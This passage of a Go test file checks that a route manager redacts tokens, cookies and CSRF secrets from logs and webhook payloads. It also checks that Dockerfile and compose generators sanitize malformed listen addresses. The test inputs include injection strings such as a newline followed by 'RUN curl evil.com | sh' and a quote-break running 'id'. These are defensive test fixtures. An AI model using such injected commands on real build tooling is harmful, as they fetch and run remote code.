			w.WriteHeader(http.StatusForbidden)
			_, _ = w.Write([]byte(straddleBody))
		}))
		defer upstream.Close()

		hookCh := make(chan challengeWebhookPayload, 1)
		hookSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var p challengeWebhookPayload
			_ = json.NewDecoder(r.Body).Decode(&p)
			hookCh <- p
			w.WriteHeader(http.StatusOK)
		}))
		defer hookSrv.Close()

		acc, err := mgr.SaveAccount(AccountProfile{
			ID:      "acc-redact-1",
			Name:    "Redact User",
			Token:   "Bearer " + tokSecret,
			Cookie:  "sid=" + cookieSecret + "; flag=1",
			Tokens:  map[string]string{"csrf": csrfSecret},
			Enabled: true,
			Status:  AccountStatusActive,
		})
		if err != nil {
			t.Fatalf("SaveAccount: %v", err)
		}

		_, err = mgr.SaveRoute(ServiceRoute{
			Slug:                "redact-url-route",
			Name:                "Redact URL",
			Enabled:             true,
			UpstreamMethod:      "GET",
			UpstreamURL:         upstream.URL + "/v1/{{account.token.csrf}}?tok={{account.token}}",
			RequireAccount:      true,
			ChallengeWebhookURL: hookSrv.URL + "/alert",
		})
		if err != nil {
			t.Fatalf("SaveRoute: %v", err)
		}

		res, err := mgr.InvokeRoute(context.Background(), "redact-url-route", TestInvokeRequest{AccountID: acc.ID})
		if err != nil {
			t.Fatalf("InvokeRoute: %v", err)
		}

		// Verify UpstreamURL in TestInvokeResult AND InvocationRecord redacted ALL secrets
		logs := mgr.ListLogs(5)
		if len(logs) == 0 {
			t.Fatalf("expected invocation log")
		}
		for _, field := range []string{res.UpstreamURL, logs[0].UpstreamURL} {
			for _, secret := range []string{tokSecret, csrfSecret, cookieSecret} {
				if strings.Contains(field, secret) {
					t.Fatalf("secret %q leaked in URL field %q", secret, field)
				}
			}
		}

		// Verify webhook payload redacted UpstreamURL AND boundary-straddling secret in BodyPreview!
		select {
		case p := <-hookCh:
			raw, _ := json.Marshal(p)
			rawStr := string(raw)
			for _, leaked := range []string{tokSecret, "SuperSecret", csrfSecret, cookieSecret} {
				if strings.Contains(rawStr, leaked) {
					t.Fatalf("secret substring %q leaked in challenge webhook payload: %s", leaked, rawStr)
				}
			}
		case <-time.After(3 * time.Second):
			t.Fatalf("timed out waiting for redacted challenge webhook")
		}
	})

	// 6. GenerateDockerfile / GenerateDockerCompose malformed listenAddr sanitization
	t.Run("DockerExportMalformedListenAddrSanitization", func(t *testing.T) {
		for _, malicious := range []string{
			"127.0.0.1:9090\nRUN curl evil.com | sh",
			`:8080" && id #`,
			":99999",
			":0",
			":notaport",
		} {
			df := GenerateDockerfile(malicious)
			dc := GenerateDockerCompose(malicious)
			if strings.Contains(df, "evil.com") || strings.Contains(df, "&& id") || !strings.Contains(df, "EXPOSE 9090\n") {
				t.Fatalf("Dockerfile did not sanitize listenAddr %q:\n%s", malicious, df)
			}
			if strings.Contains(dc, "evil.com") || strings.Contains(dc, "&& id") || !strings.Contains(dc, `"9090:9090"`) {
				t.Fatalf("DockerCompose did not sanitize listenAddr %q:\n%s", malicious, dc)
			}
		}
	})
}
